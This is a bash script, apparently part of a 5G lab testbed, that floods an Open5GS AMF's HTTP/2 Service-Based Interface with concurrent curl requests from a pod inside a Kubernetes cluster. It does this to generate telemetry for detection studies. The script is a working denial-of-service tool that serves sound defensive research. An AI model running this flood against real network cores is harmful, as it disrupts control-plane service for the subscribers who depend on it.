#!/usr/bin/env bash
# inject_sbi_flood.sh
# ───────────────────
# Injects an HTTP/2 SBI flood on the AMF by hammering its Service-Based Interface
# with concurrent requests from inside the cluster.
#
# This simulates an HTTP/2 DDoS on the AMF control plane (BSI AP4-A / Moreira et al.)
# Unlike the NAS registration storm, this hits the REST API layer directly.
#
# Usage: ./inject_sbi_flood.sh [concurrency] [duration_seconds]
# Default: 20 concurrent workers, 300 seconds

set -euo pipefail

CONCURRENCY=${1:-20}
DURATION=${2:-300}

# Dynamically resolve AMF SBI ClusterIP — robust across cluster recreates
AMF_IP=$(kubectl get svc -n open5gs open5gs-amf-sbi \
    -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "")

if [[ -z "$AMF_IP" ]]; then
    echo "ERROR: Could not resolve AMF SBI ClusterIP. Is the cluster running?"
    echo "  kubectl get svc -n open5gs open5gs-amf-sbi"
    exit 1
fi

AMF_SBI="http://${AMF_IP}:7777"
# Endpoint that triggers AMF to do real work (parse + auth + log + trace)
ENDPOINT="${AMF_SBI}/namf-comm/v1/ue-contexts/imsi-999700000000001"

echo "[sbi-flood] Target: ${ENDPOINT}"
echo "[sbi-flood] Concurrency: ${CONCURRENCY} workers"
echo "[sbi-flood] Duration: ${DURATION}s"
echo "[sbi-flood] Protocol: HTTP/2 cleartext (h2c)"
echo ""

# Find a pod inside the cluster to run from
UE_NS=$(kubectl get pods --all-namespaces | grep -i "ueransim-ues" | grep -v "Terminating" | head -1 | awk '{print $1}')
UE_POD=$(kubectl get pods --all-namespaces | grep -i "ueransim-ues" | grep -v "Terminating" | head -1 | awk '{print $2}')

if [[ -z "$UE_POD" ]]; then
    echo "ERROR: Could not find ueransim-ues pod"
    exit 1
fi
echo "[sbi-flood] Running flood from pod: $UE_POD ($UE_NS)"

# Write the flood script to run inside the pod
FLOOD_SCRIPT=$(cat <<'INNER'
#!/bin/sh
ENDPOINT="$1"
CONCURRENCY="$2"
DURATION="$3"

END_TIME=$(( $(date +%s) + DURATION ))
WAVE=0

while [ $(date +%s) -lt $END_TIME ]; do
    REMAINING=$(( END_TIME - $(date +%s) ))
    WAVE=$(( WAVE + 1 ))
    echo "[wave $WAVE] ${REMAINING}s remaining — launching $CONCURRENCY requests..."

    i=0
    while [ $i -lt $CONCURRENCY ]; do
        curl -s --max-time 3 --http2-prior-knowledge \
            "$ENDPOINT" -o /dev/null 2>/dev/null &
        i=$(( i + 1 ))
    done
    wait
    sleep 1
done

echo "[sbi-flood] Done — ran $WAVE waves over ${DURATION}s"
INNER
)

# Run the flood script inside the pod
kubectl exec -n "$UE_NS" "$UE_POD" -- sh -c "$FLOOD_SCRIPT" -- "$ENDPOINT" "$CONCURRENCY" "$DURATION"

echo ""
echo "[sbi-flood] Flood complete. Expected telemetry:"
echo "  - Prometheus: AMF cpu_rate spike, net_rx_rate spike"
echo "  - Loki: flood of HTTP 404/400 AMF SBI request logs"
echo "  - Jaeger: high volume AMF SBI spans"
